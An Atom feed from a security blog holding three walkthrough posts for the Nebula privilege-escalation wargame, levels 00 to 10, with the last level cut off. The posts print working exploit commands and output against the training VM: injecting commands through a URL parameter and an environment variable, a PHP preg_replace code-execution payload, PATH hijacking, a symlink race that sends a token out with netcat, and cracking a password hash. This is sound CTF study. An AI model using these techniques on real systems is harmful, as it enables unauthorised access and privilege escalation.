<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>blog.smigiel.dev - Learning</title><link href="https://blog.smigiel.dev/" rel="alternate"></link><link href="https://blog.smigiel.dev/feeds/learning.atom.xml" rel="self"></link><id>https://blog.smigiel.dev/</id><updated>2020-09-08T00:00:00-07:00</updated><entry><title>Exploit Education - Nebula Part 3</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-3.html" rel="alternate"></link><published>2020-09-07T00:00:00-07:00</published><updated>2020-09-08T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-07:/exploit-education-nebula-part-3.html</id><summary type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-08/"&gt;Level 08&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;This sounds easy enough. Just go to &lt;code&gt;flag08&lt;/code&gt; directory and see what kind of files are there.
At first, I felt intimidated by &lt;code&gt;root:root&lt;/code&gt; access to &lt;code&gt;capture.pcap&lt;/code&gt; file. However, it occured that the file allows to be read by anyone. In that case, we might …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-08/"&gt;Level 08&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;This sounds easy enough. Just go to &lt;code&gt;flag08&lt;/code&gt; directory and see what kind of files are there.
At first, I felt intimidated by &lt;code&gt;root:root&lt;/code&gt; access to &lt;code&gt;capture.pcap&lt;/code&gt; file. However, it occured that the file allows to be read by anyone. In that case, we might be able to copy it and retrieve necessary information.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;p&gt;After downloading &lt;code&gt;capture.pcap&lt;/code&gt; I was able to open it with &lt;code&gt;wireshark&lt;/code&gt;, where I've seen some tcp traffic. By selecting &lt;code&gt;Follow TCP&lt;/code&gt; I've noticed that this is dump of someone's login attempts.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;..wwwbugs login: l.le.ev.ve.el.l8.8&lt;/span&gt;
&lt;span class="cp"&gt;..&lt;/span&gt;
Password: backdoor...00Rm8.ate
.
&lt;span class="cp"&gt;..&lt;/span&gt;
Login incorrect
wwwbugs login:
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, hex dump shows some more details&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;000000B9  62                                                 b&lt;/span&gt;
&lt;span class="err"&gt;000000BA  61                                                 a&lt;/span&gt;
&lt;span class="err"&gt;000000BB  63                                                 c&lt;/span&gt;
&lt;span class="err"&gt;000000BC  6b                                                 k&lt;/span&gt;
&lt;span class="err"&gt;000000BD  64                                                 d&lt;/span&gt;
&lt;span class="err"&gt;000000BE  6f                                                 o&lt;/span&gt;
&lt;span class="err"&gt;000000BF  6f                                                 o&lt;/span&gt;
&lt;span class="err"&gt;000000C0  72                                                 r&lt;/span&gt;
&lt;span class="err"&gt;000000C1  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000C2  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000C3  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000C4  30                                                 0&lt;/span&gt;
&lt;span class="err"&gt;000000C5  30                                                 0&lt;/span&gt;
&lt;span class="err"&gt;000000C6  52                                                 R&lt;/span&gt;
&lt;span class="err"&gt;000000C7  6d                                                 m&lt;/span&gt;
&lt;span class="err"&gt;000000C8  38                                                 8&lt;/span&gt;
&lt;span class="err"&gt;000000C9  7f                                                 .&lt;/span&gt;
&lt;span class="err"&gt;000000CA  61                                                 a&lt;/span&gt;
&lt;span class="err"&gt;000000CB  74                                                 t&lt;/span&gt;
&lt;span class="err"&gt;000000CC  65                                                 e&lt;/span&gt;
&lt;span class="err"&gt;000000CD  0d                                                 .&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;One can notice, that &lt;code&gt;x7f&lt;/code&gt; equals to &lt;code&gt;backspace&lt;/code&gt;. It probably means, that user pressed wrong key, and removed it.
After decyphering it, it seems to be &lt;code&gt;backd00Rmate&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;➜  ~ ssh flag08@nebula&lt;/span&gt;
&lt;span class="err"&gt;flag08@nebula:~$ ls&lt;/span&gt;
&lt;span class="err"&gt;capture.pcap&lt;/span&gt;
&lt;span class="err"&gt;flag08@nebula:~$ getflag&lt;/span&gt;
&lt;span class="err"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;span class="err"&gt;flag08@nebula:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-09/"&gt;Level 09&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;I couldn't crack this one, so I searched for solution over the internet. This one is explaining it very good: &lt;a href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/"&gt;Lucian Nitescu&lt;/a&gt;. Unfortunately, my php knowledge is not the best.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;We need to use both &lt;code&gt;$filename&lt;/code&gt; and &lt;code&gt;$use_me&lt;/code&gt; variables. First one needs to contain payload, second will contain program name.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level09@nebula:~$ cat exploit.php
&lt;span class="o"&gt;[&lt;/span&gt;email &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(sh)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;}]&lt;/span&gt;
level09@nebula:~$ ~flag09/flag09 exploit.php .
PHP Notice:  Use of undefined constant sh - assumed &lt;span class="s1"&gt;&amp;#39;sh&amp;#39;&lt;/span&gt; in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;
sh-4.2$ whoami
flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Interesting that, when I replaced &lt;code&gt;sh&lt;/code&gt; with &lt;code&gt;bash&lt;/code&gt; it is not working:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;PHP Notice:  Use of undefined constant bash - assumed &lt;span class="s1"&gt;&amp;#39;bash&amp;#39;&lt;/span&gt; in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;
bash-4.2$ whoami
level09
bash-4.2$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;One can always provide &lt;code&gt;$use_me&lt;/code&gt; variable too.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level09@nebula:~$ cat exploit.php
&lt;span class="o"&gt;[&lt;/span&gt;email &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$use_me&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;}]&lt;/span&gt;
level09@nebula:~$ ~flag09/flag09 exploit.php getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; : regexp code on line &lt;span class="m"&gt;1&lt;/span&gt;

level09@nebula:~$ ~flag09/flag09 exploit.php sh
sh-4.2$ whoami
flag09
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-10/"&gt;Level 10&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;TOCTOU == Time of Check, Time of Use&lt;/p&gt;
&lt;p&gt;This is another one, where I spent significant amount of time. Even if I know how it suppose to work, I haven't been able to implement the solution correctly.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Time of Check, Time of Use means, that when program is running, it needs to verify an access to file, where we have an access. However, after doing that, we need to swap this file, with another one, which is unavailable to us.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;p&gt;Nebula instance:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level10@nebula:~$ touch my_file
level10@nebula:~$ &lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; ln -sf /home/flag10/token token&lt;span class="p"&gt;;&lt;/span&gt; ln -sf my_file token&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;4467&lt;/span&gt;
level10@nebula:~$ &lt;span class="k"&gt;while&lt;/span&gt; true&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; /home/flag10/flag10 token debian&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
You don&lt;span class="s1"&gt;&amp;#39;t have access to token&lt;/span&gt;
&lt;span class="s1"&gt;You don&amp;#39;&lt;/span&gt;t have access to token
Connecting to debian:18211 .. Connected!
Sending file .. wrote file!
Connecting to debian:18211 .. Unable to connect to host debian
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Second instance&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dasm@debian:~$ nc -klp &lt;span class="m"&gt;18211&lt;/span&gt; &amp;gt; received
dasm@debian:~$ cat received
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nebula instance&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level10@nebula:~$ su flag10
Password:  &lt;span class="c1"&gt;# use found token&lt;/span&gt;
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;</content><category term="Learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 2</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-2.html" rel="alternate"></link><published>2020-09-06T00:00:00-07:00</published><updated>2020-09-06T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-06:/exploit-education-nebula-part-2.html</id><summary type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Source code shows, that verification happens only for &lt;code&gt;token&lt;/code&gt; name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level04@nebula:/home/flag04$ ls -la
total &lt;span class="m"&gt;13&lt;/span&gt;
drwxr-x--- &lt;span class="m"&gt;2&lt;/span&gt; flag04 level04   &lt;span class="m"&gt;93&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-04/"&gt;Level 04&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Source code shows, that verification happens only for &lt;code&gt;token&lt;/code&gt; name. Let's create symbolic link to file and try to read its content. After reading it, let's use it as password.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level04@nebula:/home/flag04$ ls -la
total &lt;span class="m"&gt;13&lt;/span&gt;
drwxr-x--- &lt;span class="m"&gt;2&lt;/span&gt; flag04 level04   &lt;span class="m"&gt;93&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21&lt;/span&gt;:52 .
drwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root   root     &lt;span class="m"&gt;160&lt;/span&gt; &lt;span class="m"&gt;2012&lt;/span&gt;-08-27 &lt;span class="m"&gt;07&lt;/span&gt;:18 ..
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04   &lt;span class="m"&gt;220&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bash_logout
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04  &lt;span class="m"&gt;3353&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bashrc
-rwsr-x--- &lt;span class="m"&gt;1&lt;/span&gt; flag04 level04 &lt;span class="m"&gt;7428&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21&lt;/span&gt;:52 flag04
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04   &lt;span class="m"&gt;675&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .profile
-rw------- &lt;span class="m"&gt;1&lt;/span&gt; flag04 flag04    &lt;span class="m"&gt;37&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;21&lt;/span&gt;:52 token
level04@nebula:/home/flag04$ ./flag04 token
You may not access &lt;span class="s1"&gt;&amp;#39;token&amp;#39;&lt;/span&gt;
level04@nebula:/home/flag04$ ln -s ~flag04/token /tmp/not
level04@nebula:/home/flag04$ ./flag04 /tmp/not
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:~$ su flag04
Password:  &lt;span class="c1"&gt;# use token here&lt;/span&gt;
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-05/"&gt;Level 05&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;We're looking for weak permissions. It seems that &lt;code&gt;.backup&lt;/code&gt; directory contains copy of ssh keys, which can be used.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level05@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag05
level05@nebula:/home/flag05$ ls -ahtl
total &lt;span class="m"&gt;9&lt;/span&gt;.0K
drwxr-x--- &lt;span class="m"&gt;1&lt;/span&gt; flag05 level05   &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-09-05 &lt;span class="m"&gt;19&lt;/span&gt;:18 .
-rw------- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-09-05 &lt;span class="m"&gt;19&lt;/span&gt;:18 .bash_history
drwx------ &lt;span class="m"&gt;2&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;60&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-09-05 &lt;span class="m"&gt;19&lt;/span&gt;:17 .cache
drwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root   root     &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="m"&gt;2012&lt;/span&gt;-08-27 &lt;span class="m"&gt;07&lt;/span&gt;:18 ..
drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;42&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;20&lt;/span&gt;:13 .backup
drwx------ &lt;span class="m"&gt;2&lt;/span&gt; flag05 flag05    &lt;span class="m"&gt;70&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-11-20 &lt;span class="m"&gt;20&lt;/span&gt;:13 .ssh
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05   &lt;span class="m"&gt;220&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bash_logout
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05  &lt;span class="m"&gt;3&lt;/span&gt;.3K &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .bashrc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; flag05 flag05   &lt;span class="m"&gt;675&lt;/span&gt; &lt;span class="m"&gt;2011&lt;/span&gt;-05-18 &lt;span class="m"&gt;02&lt;/span&gt;:54 .profile
level05@nebula:/home/flag05$ &lt;span class="nb"&gt;cd&lt;/span&gt;
level05@nebula:~$ ls ~flag05/.backup
backup-19072011.tgz
level05@nebula:~$ cp ~flag05/.backup/backup-19072011.tgz .
level05@nebula:~$ tar -xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ssh flag05@localhost
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-06/"&gt;Level 06&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;flag06&lt;/code&gt; came from a legacy unix system. It probably means, that password could be stored inside &lt;code&gt;/etc/passwd&lt;/code&gt;. After retrieving password, I had to search for an answer, how to crack it. &lt;code&gt;john&lt;/code&gt; helped with that.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level06@nebula:~$ grep flag06 /etc/passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
➜  ~ john --show pass
?:hello

&lt;span class="m"&gt;1&lt;/span&gt; password &lt;span class="nb"&gt;hash&lt;/span&gt; cracked, &lt;span class="m"&gt;0&lt;/span&gt; left
level06@nebula:~$ su flag06
Password:  &lt;span class="c1"&gt;# use found password&lt;/span&gt;
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-07/"&gt;Level 07&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;User &lt;code&gt;flag07&lt;/code&gt; is running CGI server, which is pinging provided host. Host is an parameter to URL. It means, we should be able to modify URL this way, to retrieve correct information.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;p&gt;I struggled with that for a while.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level07@nebula:/home/flag07$ wget localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;getflag
--2020-09-05 &lt;span class="m"&gt;20&lt;/span&gt;:31:46--  http://localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;
Resolving localhost... &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
Connecting to localhost&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="p"&gt;|&lt;/span&gt;:7007... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: unspecified &lt;span class="o"&gt;[&lt;/span&gt;text/html&lt;span class="o"&gt;]&lt;/span&gt;
index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;: Permission denied

Cannot write to &lt;span class="sb"&gt;`&lt;/span&gt;index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; (Permission denied).&lt;/span&gt;
&lt;span class="s1"&gt;getflag is executing on a non-flag account, this doesn&amp;#39;&lt;/span&gt;t count
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I wasn't sure, why it is not revealing flag. Finally, I searched through an internet for similar solution and found what's my mistake. I was using &lt;code&gt;;&lt;/code&gt; instead of &lt;code&gt;%3b&lt;/code&gt; which is encoded semicolon. Instead of sending my payload to website, I was sending &lt;code&gt;Host=localhost&lt;/code&gt; and later, I was running separate command, under my username.&lt;/p&gt;
&lt;p&gt;Rookie error.&lt;/p&gt;
&lt;h4&gt;Alternative solution&lt;/h4&gt;
&lt;p&gt;After retrieving &lt;code&gt;getflag&lt;/code&gt; I thought about another attempt to exploit a server. For this purpose, I used &lt;code&gt;exploit.c&lt;/code&gt; prepared for another level, and I sent this query:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level07@nebula:/tmp$ cat &amp;gt; exploitable.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;cp /tmp/exploit /home/flag07/exploit&lt;/span&gt;
&lt;span class="s"&gt;chmod u+s /home/flag07/exploit&lt;/span&gt;
&lt;span class="s"&gt;EOF&lt;/span&gt;
level07@nebula:/tmp$ wget localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;%3b/tmp/exploitable.sh
level07@nebula:/tmp$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag07
level07@nebula:/home/flag07$ ls
exploit  index.cgi  thttpd.conf
level07@nebula:/home/flag07$ ./exploit
flag07@nebula:/home/flag07$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;</content><category term="Learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 1</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html" rel="alternate"></link><published>2020-09-05T00:00:00-07:00</published><updated>2020-09-05T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-05:/exploit-education-nebula-part-1.html</id><summary type="html">&lt;h1&gt;&lt;a href="https://exploit.education/nebula/"&gt;Nebula&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;Basics&lt;/h2&gt;
&lt;p&gt;Nebula VM has 20 levels. Each level can be accessed with &lt;code&gt;levelXX&lt;/code&gt; username and the same password.&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-00/"&gt;Level 00&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Search for all files, in all directories, belonging to &lt;code&gt;flag00&lt;/code&gt; user, with &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;setuid&lt;/a&gt;. Redirect all "permission error" (stderr …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;&lt;a href="https://exploit.education/nebula/"&gt;Nebula&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;Basics&lt;/h2&gt;
&lt;p&gt;Nebula VM has 20 levels. Each level can be accessed with &lt;code&gt;levelXX&lt;/code&gt; username and the same password.&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-00/"&gt;Level 00&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Search for all files, in all directories, belonging to &lt;code&gt;flag00&lt;/code&gt; user, with &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;setuid&lt;/a&gt;. Redirect all "permission error" (stderr) messages to &lt;code&gt;/dev/null&lt;/code&gt; discarding those messages.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level00@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level00@nebula:~$ find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
/bin/.../flag00
/home/flag00/.bash_logout
/home/flag00/.bashrc
/home/flag00/.profile
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-01/"&gt;Level01&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Program allows to execute arbitrary program due to &lt;code&gt;system&lt;/code&gt; call for &lt;code&gt;echo&lt;/code&gt;.
Let's create fake echo with to run &lt;code&gt;bash&lt;/code&gt; session with &lt;code&gt;flag01&lt;/code&gt; UID.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level01@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level01@nebula:~$ cat &amp;gt; /tmp/echo &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
level01@nebula:~$ chmod +x /tmp/echo
level01@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag01/
level01@nebula:/home/flag01$ ./flag01
and now what?
level01@nebula:/home/flag01$ &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp:&lt;span class="nv"&gt;$PATH&lt;/span&gt; ./flag01
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-02/"&gt;Level02&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Program is reading &lt;code&gt;USER&lt;/code&gt; variable, which can be provided by attacker.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level02@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level02@nebula:~$ &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;bash #&amp;quot;&lt;/span&gt; /home/flag02/flag02
about to call system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/echo ;bash # is cool&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

flag02@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-03/"&gt;Level03&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Cron is running script which is picking up content of &lt;code&gt;writable.d&lt;/code&gt; directory. It is executing whatever is there. It means, that anything what is running via cron, will have the same permissions.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level03@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level03@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag03
